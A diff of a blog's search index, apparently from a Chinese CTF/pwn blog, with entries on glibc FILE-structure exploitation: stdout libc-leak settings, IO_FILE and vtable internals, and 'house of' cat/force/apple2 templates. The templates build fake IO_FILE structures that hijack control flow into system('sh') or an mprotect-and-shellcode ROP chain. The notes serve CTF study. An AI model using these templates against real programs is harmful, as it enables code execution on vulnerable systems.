@@ -1,37 +1,6 @@
 <?xml version="1.0" encoding="utf-8"?>
 <search>
   <entry>
-    <title>_IO_2_1_stdout_</title>
-    <url>/2024/07/19/IO_2_1_stdout/</url>
-    <content><![CDATA[<hr>
-<h1 id="IO-2-1-stdout-的利用（速成）"><a href="#IO-2-1-stdout-的利用（速成）" class="headerlink" title="_IO_2_1_stdout_的利用（速成）"></a>_IO_2_1_stdout_的利用（速成）</h1><p>详情可看：<br><a href="https://blog.csdn.net/qq_41202237/article/details/113845320">hollk</a> </p>
-<p><a href="https://bbs.kanxue.com/thread-275968.htm#msg_header_h1_2">国资</a></p>
-<h3 id="IO-FILE-plus结构体"><a href="#IO-FILE-plus结构体" class="headerlink" title="_IO_FILE_plus结构体"></a>_IO_FILE_plus结构体</h3><pre><code>struct _IO_FILE_plus &#123;
-    FILE file;
-    const struct _IO_jump_t *vtable;
-&#125;
-</code></pre>
-<p>其中32 位的file到 vtable 偏移为 0x94，64 位偏移为 0xd8</p>
-<br>
-
-<h3 id="IO-2-1-stdout-结构体"><a href="#IO-2-1-stdout-结构体" class="headerlink" title="_IO_2_1_stdout_结构体"></a>_IO_2_1_stdout_结构体</h3><p><img src="/images/stdout.png" alt="图片">   </p>
-<p>关于利用stdout来泄露libc主要设置以下结构的值：   </p>
-<pre><code>1、flag为0xfbad18xx，一般为0xfdab1800
-
-2、更改_IO_read_ptr、_IO_read_end、_IO_read_base指针的值为0.
-
-3、_IO_write_base改为需要泄露的地址，_IO_write_ptr改为泄露地址的终止值。
-</code></pre>
-<p>改完了这些，就可以通过调用printf或者puts函数来打印出地址了。</p>
-<hr>
-]]></content>
-      <tags>
-        <tag>pwn</tag>
-        <tag>IO</tag>
-        <tag>CTF</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>format利用</title>
     <url>/2024/07/20/Fmt/</url>
     <content><![CDATA[<hr>
@@ -164,251 +133,215 @@ inter()
       </tags>
   </entry>
   <entry>
-    <title>IO</title>
-    <url>/2024/07/18/IO/</url>
+    <title>_IO_2_1_stdout_</title>
+    <url>/2024/07/19/IO_2_1_stdout/</url>
     <content><![CDATA[<hr>
-<h1 id="IO结构体"><a href="#IO结构体" class="headerlink" title="IO结构体"></a><strong>IO结构体</strong></h1><p>关于IO_file_jumps中函数的具体作用可以参考以下两个博客<br><a href="https://bbs.kanxue.com/thread-275968.htm#msg_header_h1_3">国资</a>和<a href="https://ray-cp.github.io/">ray-cp</a> 或者星盟的也可以      </p>
-<br>
-<br>
-
-<h2 id="缓冲区"><a href="#缓冲区" class="headerlink" title="缓冲区"></a>缓冲区</h2><p><em>引入原因： </em><br>对于LBA硬盘来说，读写数据都必须一块一块的读，如果我们每次执行read，write时都是操作很少的数据，则对系统消耗非常大，因此，C库就想了一个好办法——缓冲区。   </p>
-<pre><code>1、输入缓冲区   
-从外部硬件读取时。为了减少消耗，会一次从外部硬件读取一“块”数据，并放入缓冲区，然后当target需要时，再从头部慢慢读取，只到读完才再次从硬件读取。这个缓冲区叫输入缓冲区。      
-
-对于输入缓冲区ptr-end是有用的数据，base-ptr为已使用的数据。
-
-
-2、输出缓冲区  
-向外部硬件写入时。为了减少消耗，不会一有东西就写入，而是先将内容从source写入缓冲区，当缓冲区满了时候再将内存一起写入硬件。这个缓冲区叫输出缓冲区。
-
-对于输出缓冲区base-ptr是要写入硬件的内容（有用数据），ptr-end为空闲区域。  
-</code></pre>
-<h2 id="IO-FILE-plus"><a href="#IO-FILE-plus" class="headerlink" title="IO_FILE_plus"></a>IO_FILE_plus</h2><pre><code>    struct _IO_FILE_plus
-    &#123;
-    _IO_FILE file;
+<h1 id="IO-2-1-stdout-的利用（速成）"><a href="#IO-2-1-stdout-的利用（速成）" class="headerlink" title="_IO_2_1_stdout_的利用（速成）"></a>_IO_2_1_stdout_的利用（速成）</h1><p>详情可看：<br><a href="https://blog.csdn.net/qq_41202237/article/details/113845320">hollk</a> </p>
+<p><a href="https://bbs.kanxue.com/thread-275968.htm#msg_header_h1_2">国资</a></p>
+<h3 id="IO-FILE-plus结构体"><a href="#IO-FILE-plus结构体" class="headerlink" title="_IO_FILE_plus结构体"></a>_IO_FILE_plus结构体</h3><pre><code>struct _IO_FILE_plus &#123;
+    FILE file;
     const struct _IO_jump_t *vtable;
-    &#125;;
-    IO_FILE(结构体）
-    - struct _IO_FILE &#123;
-    int _flags;       /* High-order word is _IO_MAGIC; rest is flags. */
-    #define _IO_file_flags _flags
-
-char_IO_read_ptr;   /* Current read pointer */ 
-char_IO_read_end;   /* End of get area. */
-char_IO_read_base;  /* Start of putback+get area. */
-- //read ptr是现在read指针指向的位置，end则是read读取结束的位置，base则是开始的位置
-- 
-
-char_IO_write_base; /* Start of put area. */
-char_IO_write_ptr;  /* Current put pointer. */
-char_IO_write_end;  /* End of put area. */
-//write的指针的作用是与read指针的作用是一致的
-
-char_IO_buf_base;   /* Start of reserve area. */
-char_IO_buf_end;    /* End of reserve area. */
-//缓冲区的位置
-
-
-/* The following fields are used to support backing up and undo. */
-char *_IO_save_base; /* Pointer to start of non-current get area. */
-char *_IO_backup_base;  /* Pointer to first valid character of backup area */
-char *_IO_save_end; /* Pointer to end of non-current get area. */
-
-struct _IO_marker *_markers;
-
-struct _IO_FILE *_chain;
-//chain依次链接的是stdin、stdout、stderr
-
-int _fileno;
-//一般指的是目前是在哪个chain里，0是in，1是out，2是err
-
-#if 0
-int _blksize;
-#else
-int _flags2;
-#endif
-_IO_off_t _old_offset; /* This used to be _offset but it&#39;s too small.  */
-
-#define __HAVE_COLUMN /* temporary */
-/* 1+column number of pbase(); 0 is unknown. */
-unsigned short _cur_column;
-signed char _vtable_offset;
-char _shortbuf[1];
-
-/*  char* _save_gptr;  char* _save_egptr; */
-
-_IO_lock_t *_lock;
-#ifdef _IO_USE_OLD_IO_FILE
-&#125;;
-</code></pre>
-<br>
-<br>
-
-<h2 id="IO-jump-t"><a href="#IO-jump-t" class="headerlink" title="_IO_jump_t"></a>_IO_jump_t</h2><pre><code>struct _IO_jump_t
-&#123;
-    JUMP_FIELD(size_t, __dummy);
-    JUMP_FIELD(size_t, __dummy2);
-    JUMP_FIELD(_IO_finish_t, __finish);
-    JUMP_FIELD(_IO_overflow_t, __overflow);
-    JUMP_FIELD(_IO_underflow_t, __underflow);
-    JUMP_FIELD(_IO_underflow_t, __uflow);
-    JUMP_FIELD(_IO_pbackfail_t, __pbackfail);
-    /* showmany */
-    JUMP_FIELD(_IO_xsputn_t, __xsputn);
-    JUMP_FIELD(_IO_xsgetn_t, __xsgetn);
-    JUMP_FIELD(_IO_seekoff_t, __seekoff);
-    JUMP_FIELD(_IO_seekpos_t, __seekpos);
-    JUMP_FIELD(_IO_setbuf_t, __setbuf);
-    JUMP_FIELD(_IO_sync_t, __sync);
-    JUMP_FIELD(_IO_doallocate_t, __doallocate);
-    JUMP_FIELD(_IO_read_t, __read);
-    JUMP_FIELD(_IO_write_t, __write);
-    JUMP_FIELD(_IO_seek_t, __seek);
-    JUMP_FIELD(_IO_close_t, __close);
-    JUMP_FIELD(_IO_stat_t, __stat);
-    JUMP_FIELD(_IO_showmanyc_t, __showmanyc);
-    JUMP_FIELD(_IO_imbue_t, __imbue);
-#if 0
-    get_column;
-    set_column;
-#endif
-&#125;;
-</code></pre>
-<br>
-<br>
-
-<h2 id="IO-str-jumps"><a href="#IO-str-jumps" class="headerlink" title="IO_str_jumps"></a>IO_str_jumps</h2><pre><code>1. // libio/strops.c
-2. 
-3. const struct _IO_jump_t _IO_str_jumps libio_vtable =
-4. &#123;
-5.   JUMP_INIT_DUMMY,
-6.   JUMP_INIT(finish, _IO_str_finish),
-7.   JUMP_INIT(overflow, _IO_str_overflow),
-8.   JUMP_INIT(underflow, _IO_str_underflow),
-9.   JUMP_INIT(uflow, _IO_default_uflow),
-10.   JUMP_INIT(pbackfail, _IO_str_pbackfail),
-11.   JUMP_INIT(xsputn, _IO_default_xsputn),
-12.   JUMP_INIT(xsgetn, _IO_default_xsgetn),
-13.   JUMP_INIT(seekoff, _IO_str_seekoff),
-14.   JUMP_INIT(seekpos, _IO_default_seekpos),
-15.   JUMP_INIT(setbuf, _IO_default_setbuf),
-16.   JUMP_INIT(sync, _IO_default_sync),
-17.   JUMP_INIT(doallocate, _IO_default_doallocate),
-18.   JUMP_INIT(read, _IO_default_read),
-19.   JUMP_INIT(write, _IO_default_write),
-20.   JUMP_INIT(seek, _IO_default_seek),
-21.   JUMP_INIT(close, _IO_default_close),
-22.   JUMP_INIT(stat, _IO_default_stat),
-23.   JUMP_INIT(showmanyc, _IO_default_showmanyc),
-24.   JUMP_INIT(imbue, _IO_default_imbue)
-25. &#125;;
-</code></pre>
-<br>
-<br>                                                                               
-                                                                                             
-
-
-<h2 id="IO-file-jumps"><a href="#IO-file-jumps" class="headerlink" title="IO_file_jumps"></a>IO_file_jumps</h2><pre><code>&#123;
-__dummy = 0,
-__dummy2 = 0,
-__finish = 0x7ffff7c91a30 &lt;_IO_new_file_finish&gt;,
-__overflow = 0x7ffff7c92de0 &lt;_IO_new_file_overflow&gt;,
-__underflow = 0x7ffff7c92630 &lt;_IO_new_file_underflow&gt;,
-__uflow = 0x7ffff7c95590 &lt;__GI__IO_default_uflow&gt;,
-__pbackfail = 0x7ffff7c96dd0 &lt;__GI__IO_default_pbackfail&gt;,
-__xsputn = 0x7ffff7c939d0 &lt;_IO_new_file_xsputn&gt;,
-__xsgetn = 0x7ffff7c93d10 &lt;__GI__IO_file_xsgetn&gt;,
-__seekoff = 0x7ffff7c93150 &lt;_IO_new_file_seekoff&gt;,
-__seekpos = 0x7ffff7c95cb0 &lt;_IO_default_seekpos&gt;,
-__setbuf = 0x7ffff7c923f0 &lt;_IO_new_file_setbuf&gt;,
-__sync = 0x7ffff7c93000 &lt;_IO_new_file_sync&gt;,
-__doallocate = 0x7ffff7c85110 &lt;__GI__IO_file_doallocate&gt;,
-__read = 0x7ffff7c938a0 &lt;__GI__IO_file_read&gt;,
-__write = 0x7ffff7c93930 &lt;_IO_new_file_write&gt;,
-__seek = 0x7ffff7c938c0 &lt;__GI__IO_file_seek&gt;,
-__close = 0x7ffff7c93920 &lt;__GI__IO_file_close&gt;,
-__stat = 0x7ffff7c938d0 &lt;__GI__IO_file_stat&gt;,
-__showmanyc = 0x7ffff7c96f80 &lt;_IO_default_showmanyc&gt;,
-__imbue = 0x7ffff7c96f90 &lt;_IO_default_imbue&gt;
 &#125;
 </code></pre>
-  <br>
+<p>其中32 位的file到 vtable 偏移为 0x94，64 位偏移为 0xd8</p>
+<br>
 
-<h3 id="glibc2-24增加的vtable-check"><a href="#glibc2-24增加的vtable-check" class="headerlink" title="glibc2.24增加的vtable_check"></a>glibc2.24增加的vtable_check</h3><pre><code>2.23 的没有任何限制，可以将vtable 劫持在堆上并修改其内容，然后触发FSOP.   
+<h3 id="IO-2-1-stdout-结构体"><a href="#IO-2-1-stdout-结构体" class="headerlink" title="_IO_2_1_stdout_结构体"></a>_IO_2_1_stdout_结构体</h3><p><img src="/images/stdout.png" alt="图片">   </p>
+<p>关于利用stdout来泄露libc主要设置以下结构的值：   </p>
+<pre><code>1、flag为0xfbad18xx，一般为0xfdab1800
 
-2.24 引入了vtable check，使得将vtable 整体劫持到堆上已不可能，大佬发现可以使用内部的vtable中_IO_str_jumps或_IO_wstr_jumps来进行利用。   
+2、更改_IO_read_ptr、_IO_read_end、_IO_read_base指针的值为0.
 
-2.31 中将_IO_str_finish函数中强制执行free函数，导致无法使用上述问题，因而催生出其他调用链。
-
-
-void _IO_vtable_check (void) attribute_hidden;
-static inline const struct _IO_jump_t *
-IO_validate_vtable (const struct _IO_jump_t *vtable)
-&#123;
-uintptr_t section_length = __stop___libc_IO_vtables -__start___libc_IO_vtables;
-uintptr_t ptr = (uintptr_t) vtable;
-uintptr_t offset = ptr -(uintptr_t)__start___libc_IO_vtables;
-if (__glibc_unlikely (offset &gt;= section_length))
-    _IO_vtable_check ();
-return vtable;
-&#125;     
+3、_IO_write_base改为需要泄露的地址，_IO_write_ptr改为泄露地址的终止值。
 </code></pre>
-<h4 id="虚表范围-glibc2-37之前"><a href="#虚表范围-glibc2-37之前" class="headerlink" title="虚表范围-glibc2.37之前"></a>虚表范围-glibc2.37之前</h4><p>虚表位置判断主要在IO_validate_vtable函数，2.37以前判断区间为_IO_helper_jumps - _IO_str_jumps之间的区域 0xd60，里面有以下虚表。</p>
-<pre><code>_IO_helper_jumps
-_IO_helper_jumps
-_IO_cookie_jumps
-_IO_proc_jumps
-_IO_str_chk_jumps
-_IO_wstrn_jumps
-_IO_wstr_jumps
-_IO_wfile_jumps_maybe_mmap
-_IO_wfile_jumps_mmap
-__GI__IO_wfile_jumps
-_IO_wmem_jumps
-_IO_mem_jumps
-_IO_strn_jumps
-_IO_obstack_jumps
-_IO_file_jumps_maybe_mmap
-_IO_file_jumps_mmap
-__GI__IO_file_jumps
-_IO_str_jumps
-</code></pre>
-<p>之后居然还有虚表check绕过<br>详情：<br><a href="https://bbs.kanxue.com/thread-275968.htm#msg_header_h1_3">https://bbs.kanxue.com/thread-275968.htm#msg_header_h1_3</a></p>
-<br> 
-    几个常用的函数：  
-  
-<pre><code>    1、_IO_new_file_overflow   
-    这个函数意图比较简单，主要是处理当输出缓冲区用完时，向硬盘写入数据。当然，其实这个函数内部非常复杂，加入了一些检测。  
-
-    2、_IO_new_file_unflow      
-    这个函数与_IO_new_file_overflow差不多，主要是用于从硬盘中读取数据，每次读取都是_IO_buf_base 至 _IO_buf_end。为了防止硬盘中没有这么多数据，设置_IO_read_end为读取的总数。  
-
-    3、__GI__IO_file_read（_IO_file_read）
-    这个是输入的最终函数，它将syscall_read进行了一定的封装。
-
-    4、_IO_new_file_write 
-    这个是输出的最终函数，它将syscall_write进行了一定的封装。
-
-    5、IO_default_seekpos
-    就是调用_IO_new_file_seekoff。
-
-    6、_IO_new_file_seekoff
-    设置偏移函数，就是设置我们所说的ptr指针。
-
-    7、__GI__IO_file_xsgetn（_IO_file_xsgetn）
-    这个函数是主要目的是将数据从输入缓冲区放入target。
-    说明：我们平时的输入函数主要就是调用此函数。
-
-    8、_IO_new_file_xsputn
-    这个函数是主要目的是将数据从source放入输出输出缓冲区。
-    说明：我们平时的输出函数主要就是调用此函数。
-</code></pre>
+<p>改完了这些，就可以通过调用printf或者puts函数来打印出地址了。</p>
 <hr>
 ]]></content>
       <tags>
         <tag>pwn</tag>
         <tag>IO</tag>
-        <tag>ctf</tag>
+        <tag>CTF</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>house of模板</title>
+    <url>/2024/07/25/house%20of/</url>
+    <content><![CDATA[<h1 id="house-of-利用模板及利用条件"><a href="#house-of-利用模板及利用条件" class="headerlink" title="house of 利用模板及利用条件"></a>house of 利用模板及利用条件</h1><span id="more"></span>
+
+<hr>
+<p><em>tips:</em><br>1、于glibc2.34后glibc就移除了hook一类<br>2、_malloc_assert于glibc2.35被移除</p>
+<h2 id="house-of-cat"><a href="#house-of-cat" class="headerlink" title="house of cat"></a>house of cat</h2><p>原文链接：<a href="https://bbs.kanxue.com/thread-273895.htm#msg_header_h3_6">https://bbs.kanxue.com/thread-273895.htm#msg_header_h3_6</a><br><br><br><em>条件</em><br>glibc版本：任何版本<br>地址：libc_base、heap<br>可触发IO流:FSOP、_malloc_assert或存在可以进入IO链的函数如puts<br><br></p>
+<p><em>调用链： </em><br>1、_IO_wfile_jumps-&gt;_IO_wfile_seekoff-&gt;_IO_switch_to_wget_mode(fp)-&gt;伪造file<br>2、exit() –&gt; __run_exit_handlers –&gt; _IO_cleanup –&gt; _IO_flush_all_lockp –&gt; _IO_wfile_seekoff–&gt; _IO_switch_to_wget_mode –&gt; _IO_switch_to_wget_mode 的 call rax</p>
+<h3 id="模板"><a href="#模板" class="headerlink" title="模板"></a>模板</h3><pre><code>fake_io_addr=heapbase+0xb00 # 伪造的fake_IO结构体的地址
+next_chain = 0
+fake_IO_FILE=p64(rdi)         #_flags=rdi
+fake_IO_FILE+=p64(0)*7
+fake_IO_FILE +=p64(1)+p64(2) # rcx!=0(FSOP)
+fake_IO_FILE +=p64(fake_io_addr+0xb0)#_IO_backup_base=rdx
+fake_IO_FILE +=p64(call_addr)#_IO_save_end=call addr(call setcontext/system)
+fake_IO_FILE = fake_IO_FILE.ljust(0x68, &#39;\x00&#39;)
+fake_IO_FILE += p64(0)  # _chain
+fake_IO_FILE = fake_IO_FILE.ljust(0x88, &#39;\x00&#39;)
+fake_IO_FILE += p64(heapbase+0x1000)  # _lock = a writable address
+fake_IO_FILE = fake_IO_FILE.ljust(0xa0, &#39;\x00&#39;)
+fake_IO_FILE +=p64(fake_io_addr+0x30)#_wide_data,rax1_addr
+fake_IO_FILE = fake_IO_FILE.ljust(0xc0, &#39;\x00&#39;)
+fake_IO_FILE += p64(1) #mode=1
+fake_IO_FILE = fake_IO_FILE.ljust(0xd8, &#39;\x00&#39;)
+fake_IO_FILE += p64(libcbase+0x2160c0+0x10)  # vtable=IO_wfile_jumps+0x10
+fake_IO_FILE +=p64(0)*6
+fake_IO_FILE += p64(fake_io_addr+0x40)  # rax2_addr
+</code></pre>
+<p>其中fake_io_addr为我们伪造IO_FILE结构体的地址。<br>vtable函数，如果打FSOP则改成IO_wifle_jumps+0x30.<br>rdi、rdx为我们调用函数的参数。  </p>
+<br>
+
+<p>例子orw：  </p>
+<pre><code>Fake_IO_File_Structure = IO_FILE_plus_struct(fake_io_addr)
+Fake_IO_File_Structure._IO_save_base = p64(1)                                           # RCX
+Fake_IO_File_Structure._IO_backup_base = p64(fake_io_addr + 0x120 - 0xa0)               # mov    rdx, qword ptr [rax + 0x20]
+Fake_IO_File_Structure._IO_save_end = p64(setcontext)                                   # call   qword ptr [rax + 0x18]
+Fake_IO_File_Structure._wide_data = p64(fake_io_addr + 0x30)                            # mov    rax, qword ptr [rdi + 0xa0]
+Fake_IO_File_Structure._offset = 0
+Fake_IO_File_Structure._vtable_offset = 0
+Fake_IO_File_Structure._mode = 1
+Fake_IO_File_Structure.vtable = p64(libc_base + libc.sym[&#39;_IO_wfile_jumps&#39;] + 0x30)
+
+Fake_IO_File_Structure = bytes(Fake_IO_File_Structure)
+Fake_IO_File_Structure += p64(0) * 6
+Fake_IO_File_Structure += p64(fake_io_addr + 0x40)                                      # mov    rax, qword ptr [rax + 0xe0]
+Fake_IO_File_Structure = Fake_IO_File_Structure.ljust(0x120, b&#39;\x00&#39;) + p64(fake_io_addr + 0x128) + p64(ret)
+rop = p64(rdi) + p64((fake_io_addr &gt;&gt; 12) &lt;&lt; 12) + p64(rsi) + p64(0x1000) + p64(rdx_r12) + p64(7) * 2 + p64(mprotect) + p64(fake_io_addr + 0x178) + asm(shellcraft.cat(&#39;/flag&#39;))
+
+Fake_IO_File_Structure += rop
+</code></pre>
+<br>
+<br> 
+
+<h3 id="house-of-force"><a href="#house-of-force" class="headerlink" title="house of force"></a>house of force</h3><p><em>条件</em><br>1、glibc：2.23-2.29<br>2、malloc size无限制，或size可以很大<br>3、至少可以溢出8字节</p>
+<p><em>利用流程：</em></p>
+<pre><code>修改topchunk_size为0xffffffffffffffff
+计算target_size=target_addrtopchunk_addr-0x30
+malloc一个chunk
+getshell
+ 
+ 
+</code></pre>
+<br>
+ 
+<h2 id="house-of-apple2"><a href="#house-of-apple2" class="headerlink" title="house of apple2"></a>house of apple2</h2><p>个人感觉这个house of apple与house of cat不同必须要泄露heap地址，毕竟apple需要两个伪造的地址来控制eip，除非你知道栈地址。<br>具体原理请看:<a href="https://bbs.kanxue.com/thread-273832.htm">https://bbs.kanxue.com/thread-273832.htm</a>       </p>
+<br>
+<em>适用版本</em>    
+glibc:2.34-         
+
+<br>
+<em>条件</em>                               
+
+<p>1、能控制_IO_FILE的vtable和_wide_data，或者可以largebinattack<br>2、可以泄露heap和libc地址<br>3、可以执行IO流，exit、malloc assert、返回main函数…….  </p>
+<br>
+<br>
+
+<h3 id="漏洞成因"><a href="#漏洞成因" class="headerlink" title="漏洞成因"></a>漏洞成因</h3><p>在_IO_2_1_stderr&#x2F;stdout&#x2F;stdin_中，vatable函数在glibc2.24之后，增加了范围检查。<br>但是在_IO_wide_date这个结构体成员变量中，存在一个_wide_vtable成员变量，这个功能与vatble一致,但是与file结构体中的vtable不同的是，在这个_wide_vtable中是没有范围检查的直接调用宏了。<br><br></p>
+<p><em>所以根据上述描述可以将</em><br>    _IO_wide_date覆盖成我们的可控heap地址<br>    vtable覆盖成_IO_wfile_jmups<br>    _wide_vtable劫持为我们的rip        </p>
+<h3 id="共有三种v劫持IO流的方式"><a href="#共有三种v劫持IO流的方式" class="headerlink" title="共有三种v劫持IO流的方式"></a>共有三种v劫持IO流的方式</h3><pre><code>_IO_wfile_overflow
+_IO_wfile_underflow_mmap
+_IO_wdefault_xsgetn
+</code></pre>
+<br>
+
+<h3 id="1、-利用-IO-wfile-overflow"><a href="#1、-利用-IO-wfile-overflow" class="headerlink" title="1、 利用_IO_wfile_overflow"></a>1、 利用_IO_wfile_overflow</h3><p><em>调用链</em>     </p>
+<pre><code>_IO_wfile_overflow
+    _IO_wdoallocbuf
+        _IO_WDOALLOCATE
+            *(fp-&gt;_wide_data-&gt;_wide_vtable + 0x68)(fp)
+</code></pre>
+<br>
+<em>伪造file及_IO_wide_date_</em>
+
+<pre><code>_flags设置为~(2 | 0x8 | 0x800)，如果不需要控制rdi，设置为0即可；如果需要获得shell，可设置为 sh;，注意前面有两个空格
+vtable设置为_IO_wfile_jumps/_IO_wfile_jumps_mmap/_IO_wfile_jumps_maybe_mmap地址（加减偏移），使其能成功调用_IO_wfile_overflow即可
+_wide_data设置为可控堆地址A，即满足*(fp + 0xa0) = A
+_wide_data-&gt;_IO_write_base设置为0，即满足*(A + 0x18) = 0
+_wide_data-&gt;_IO_buf_base设置为0，即满足*(A + 0x30) = 0
+_wide_data-&gt;_wide_vtable设置为可控堆地址B，即满足*(A + 0xe0) = B
+_wide_data-&gt;_wide_vtable-&gt;doallocate设置为地址C用于劫持RIP，即满足*(B + 0x68) = C
+</code></pre>
+<p><em>条件绕过</em>        </p>
+<pre><code>需要满足f-&gt;_flags &amp; _IO_NO_WRITES == 0并且f-&gt;_flags &amp; _IO_CURRENTLY_PUTTING == 0和f-&gt;_wide_data-&gt;_IO_write_base == 0
+需要满足fp-&gt;_wide_data-&gt;_IO_buf_base != 0和fp-&gt;_flags &amp; _IO_UNBUFFERED == 0。
+</code></pre>
+<br>
+    模板（getshell）
+<em>需要将伪造chunk的pre_size位伪造成  '  sh;'  或者  ';sh\x00'  </em>    
+
+
+<pre><code>    fake_io_file = p64(0)*2 + p64(1) + p64(2)
+    fake_io_file = fake_io_file.ljust(0xa0 - 0x10, b&#39;\0&#39;) + p64(chunk_addr+0x100) # _wide_data
+    fake_io_file = fake_io_file.ljust(0xc0 - 0x10, b&#39;\0&#39;) + p64(0xffffffffffffffff) # _mode
+    fake_io_file = fake_io_file.ljust(0xd8 - 0x10, b&#39;\0&#39;) + p64(io_wfile_jumps) # vtable
+    fake_io_file = fake_io_file.ljust(0x100 - 0x10 + 0xe0, b&#39;\0&#39;) + p64(chunk_addr+0x200)
+    fake_io_file = fake_io_file.ljust(0x200-0x10,b&#39;\0&#39;)+p64(0)*13+ p64(sys)
+    
+</code></pre>
+<br>
+<br>
+
+<h3 id="2、利用IO-wfile-underflow-mmap"><a href="#2、利用IO-wfile-underflow-mmap" class="headerlink" title="2、利用IO_wfile_underflow_mmap"></a>2、利用IO_wfile_underflow_mmap</h3><p><em>调用链</em><br>    _IO_wfile_underflow_mmap<br>        _IO_wdoallocbuf<br>            _IO_WDOALLOCATE<br>                *(fp-&gt;_wide_data-&gt;_wide_vtable + 0x68)(fp)          </p>
+<br>
+<em>伪造</em>   
+
+<pre><code>_flags设置为~4，如果不需要控制rdi，设置为0即可；如果需要获得shell，可设置为 sh;，注意前面有个空格
+vtable设置为_IO_wfile_jumps_mmap地址（加减偏移），使其能成功调用_IO_wfile_underflow_mmap即可
+_IO_read_ptr &lt; _IO_read_end，即满足*(fp + 8) &lt; *(fp + 0x10)
+_wide_data设置为可控堆地址A，即满足*(fp + 0xa0) = A
+_wide_data-&gt;_IO_read_ptr &gt;= _wide_data-&gt;_IO_read_end，即满足*A &gt;= *(A + 8)
+_wide_data-&gt;_IO_buf_base设置为0，即满足*(A + 0x30) = 0
+_wide_data-&gt;_IO_save_base设置为0或者合法的可被free的地址，即满足*(A + 0x40) = 0
+_wide_data-&gt;_wide_vtable设置为可控堆地址B，即满足*(A + 0xe0) = B
+_wide_data-&gt;_wide_vtable-&gt;doallocate设置为地址C用于劫持RIP，即满足*(B + 0x68) = C
+</code></pre>
+<br>
+<em>条件绕过</em>       
+
+<pre><code>需要设置fp-&gt;_flags &amp; _IO_NO_READS == 0，设置fp-&gt;_wide_data-&gt;_IO_read_ptr &gt;= fp-&gt;_wide_data-&gt;_IO_read_end，设置fp-&gt;_IO_read_ptr &lt; fp-&gt;_IO_read_end不进入调用，设置fp-&gt;_wide_data-&gt;_IO_buf_base == NULL和fp-&gt;_wide_data-&gt;_IO_save_base == NULL。        
+</code></pre>
+<br>
+
+<h3 id="3、利用-IO-wdefault-xsgetn"><a href="#3、利用-IO-wdefault-xsgetn" class="headerlink" title="3、利用_IO_wdefault_xsgetn"></a>3、利用_IO_wdefault_xsgetn</h3><p><em>调用链</em>    </p>
+<pre><code>_IO_wdefault_xsgetn
+    __wunderflow
+        _IO_switch_to_wget_mode
+            _IO_WOVERFLOW
+                *(fp-&gt;_wide_data-&gt;_wide_vtable + 0x18)(fp)
+</code></pre>
+<br>
+<em>伪造</em>       
+
+<pre><code>_flags设置为0x800
+vtable设置为_IO_wstrn_jumps/_IO_wmem_jumps/_IO_wstr_jumps地址（加减偏移），使其能成功调用_IO_wdefault_xsgetn即可
+_mode设置为大于0，即满足*(fp + 0xc0) &gt; 0
+_wide_data设置为可控堆地址A，即满足*(fp + 0xa0) = A
+_wide_data-&gt;_IO_read_end == _wide_data-&gt;_IO_read_ptr设置为0，即满足*(A + 8) = *A
+_wide_data-&gt;_IO_write_ptr &gt; _wide_data-&gt;_IO_write_base，即满足*(A + 0x20) &gt; *(A + 0x18)
+_wide_data-&gt;_wide_vtable设置为可控堆地址B，即满足*(A + 0xe0) = B
+_wide_data-&gt;_wide_vtable-&gt;overflow设置为地址C用于劫持RIP，即满足*(B + 0x18) = C
+</code></pre>
+<br>
+
+<p><em>条件绕过</em>   </p>
+<pre><code>直接设置fp-&gt;_wide_data-&gt;_IO_read_ptr == fp-&gt;_wide_data-&gt;_IO_read_end，使得count为0，不进入if分支。
+随后当more != 0时会进入__wunderflow。   
+要想调用到_IO_switch_to_wget_mode，需要设置fp-&gt;mode &gt; 0，并且fp-&gt;_flags &amp; _IO_CURRENTLY_PUTTING != 0。
+当满足fp-&gt;_wide_data-&gt;_IO_write_ptr &gt; fp-&gt;_wide_data-&gt;_IO_write_base时就会调用_IO_WOVERFLOW(fp)。
+</code></pre>
+<br>
+<br>
+
+<hr>
+]]></content>
+      <tags>
+        <tag>pwn</tag>
+        <tag>IO</tag>
+        <tag>house of</tag>
       </tags>
   </entry>
   <entry>
@@ -861,189 +794,256 @@ syscall;
 ]]></content>
       <tags>
         <tag>pwn</tag>
-        <tag>ctf</tag>
         <tag>orw</tag>
+        <tag>ctf</tag>
       </tags>
   </entry>
   <entry>
-    <title>house of模板</title>
-    <url>/2024/07/25/house%20of/</url>
-    <content><![CDATA[<h1 id="house-of-利用模板及利用条件"><a href="#house-of-利用模板及利用条件" class="headerlink" title="house of 利用模板及利用条件"></a>house of 利用模板及利用条件</h1><span id="more"></span>
-
-<hr>
-<p><em>tips:</em><br>1、于glibc2.34后glibc就移除了hook一类<br>2、_malloc_assert于glibc2.35被移除</p>
-<h2 id="house-of-cat"><a href="#house-of-cat" class="headerlink" title="house of cat"></a>house of cat</h2><p>原文链接：<a href="https://bbs.kanxue.com/thread-273895.htm#msg_header_h3_6">https://bbs.kanxue.com/thread-273895.htm#msg_header_h3_6</a><br><br><br><em>条件</em><br>glibc版本：任何版本<br>地址：libc_base、heap<br>可触发IO流:FSOP、_malloc_assert或存在可以进入IO链的函数如puts<br><br></p>
-<p><em>调用链： </em><br>1、_IO_wfile_jumps-&gt;_IO_wfile_seekoff-&gt;_IO_switch_to_wget_mode(fp)-&gt;伪造file<br>2、exit() –&gt; __run_exit_handlers –&gt; _IO_cleanup –&gt; _IO_flush_all_lockp –&gt; _IO_wfile_seekoff–&gt; _IO_switch_to_wget_mode –&gt; _IO_switch_to_wget_mode 的 call rax</p>
-<h3 id="模板"><a href="#模板" class="headerlink" title="模板"></a>模板</h3><pre><code>fake_io_addr=heapbase+0xb00 # 伪造的fake_IO结构体的地址
-next_chain = 0
-fake_IO_FILE=p64(rdi)         #_flags=rdi
-fake_IO_FILE+=p64(0)*7
-fake_IO_FILE +=p64(1)+p64(2) # rcx!=0(FSOP)
-fake_IO_FILE +=p64(fake_io_addr+0xb0)#_IO_backup_base=rdx
-fake_IO_FILE +=p64(call_addr)#_IO_save_end=call addr(call setcontext/system)
-fake_IO_FILE = fake_IO_FILE.ljust(0x68, &#39;\x00&#39;)
-fake_IO_FILE += p64(0)  # _chain
-fake_IO_FILE = fake_IO_FILE.ljust(0x88, &#39;\x00&#39;)
-fake_IO_FILE += p64(heapbase+0x1000)  # _lock = a writable address
-fake_IO_FILE = fake_IO_FILE.ljust(0xa0, &#39;\x00&#39;)
-fake_IO_FILE +=p64(fake_io_addr+0x30)#_wide_data,rax1_addr
-fake_IO_FILE = fake_IO_FILE.ljust(0xc0, &#39;\x00&#39;)
-fake_IO_FILE += p64(1) #mode=1
